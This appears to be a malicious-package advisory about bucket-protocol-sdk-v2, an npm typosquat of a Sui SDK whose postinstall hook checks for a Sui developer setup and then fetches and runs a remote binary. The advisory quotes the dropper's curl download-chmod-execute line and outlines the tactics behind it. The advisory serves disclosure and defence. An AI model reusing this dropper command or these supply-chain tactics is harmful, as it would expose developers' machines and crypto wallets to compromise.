summary: bucket-protocol-sdk-v2 ships a postinstall dropper targeting Sui developers
details: Package self-describes as a 'community maintained drop-in replacement' for the legitimate Sui-ecosystem bucket-protocol-sdk but ships no real library code (src/bucket.ts contains only `export {};` and no dist/ output). The only executable code is install.js, invoked from package.json's `postinstall` hook (`"postinstall": "node install.js"`). install.js checks for a Sui developer environment (presence of the `sui` CLI or `~/.sui/sui_config/client.yaml`), then runs `curl -s -L -o /tmp/.sui-helper ${implantUrl} && chmod +x /tmp/.sui-helper && /tmp/.sui-helper &` to fetch a remote binary, stage it as a hidden dotfile under /tmp, mark it executable, and run it in the background. The variable is literally named `implantUrl` and the source comment reads `PUT YOUR ACTUAL 0x0.st URL HERE`, indicating a staged dropper where the operator intends to fill in a 0x0.st (anonymous file host) URL. The combination of typosquat naming targeting a real Sui DeFi SDK, an empty library facade, platform-gated victim selection (Sui dev machines, where wallet keys and seed phrases live), an anonymous-host dropper with no integrity check, and hidden /tmp staging is unambiguously malicious scaffolding. Even with the URL field currently empty, publishing this payload to npm is preparation of a supply-chain attack against Sui developers.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
